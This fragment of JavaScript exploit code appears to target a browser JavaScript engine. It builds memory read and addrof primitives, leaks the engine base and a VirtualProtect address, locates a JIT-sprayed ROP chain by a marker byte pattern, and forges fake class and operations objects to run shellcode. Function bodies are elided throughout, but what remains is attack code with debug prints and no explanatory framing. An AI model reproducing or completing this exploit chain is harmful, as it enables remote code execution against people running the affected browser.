...
function real_read_qword(addr){
    ...
    let ret_value = new Int64(pri_view.slice(0, 8));
    //print("[+] ret_value" + pri_view.slice(0, 8));
    return ret_value;
}

function real_read_dword(addr){
    let value = real_read_qword(addr).bytes();
...
function real_addrof(obj){
    ...
    ret_value = Int64.fromJSValue(ret_value.bytes());
    return ret_value;
}
...
function leak_vp_function_addr(){
    ...
    */
    let js_base = leak_js_base(leak_js_addr);
    print("[+] js_base: " + js_base);
    let vp_addr = leak_vp_function(js_base);
...
function prepare_run_sc(){
    ...
    print("[+] would u be here???");
    /*  [+] Now we want to control rcx, rdx, r8, r9 */
    for(let i = 0; i < 12; i++){
        build_rop_chain();
    }

    let func_addr = real_addrof(build_rop_chain);
    let jit_info = Add(func_addr, 0x30);
    let jit_addr = real_read_qword(jit_info);
    let code_addr = real_read_qword(jit_addr);
    
    let mark_byte = new Int64("0x0006eb909090d487");
    let rop_chain_addr = leak_rop_chain_addr(code_addr, mark_byte);
    rop_chain_addr = Sub(rop_chain_addr, 0x1);
    print("[+] rop chain at here: " + rop_chain_addr);
    
    print("[+] build_rop_chain_func addr: " + func_addr);
    print("[+] code_addr: " + code_addr);
    /*  [+] shellcode addr */
    let sc_arr_addr = new Int64(real_addrof(shellcode));
...
function run_your_shellcode(rop_addr){
    ...
    let sc_u8_addr = real_addrof(sc_u8);
    ...
    */
    let fake_clasp_arr_addr  = new Int64(real_addrof(fake_clasp));
    ...
    let fake_cops_addr = real_addrof(fake_cops);
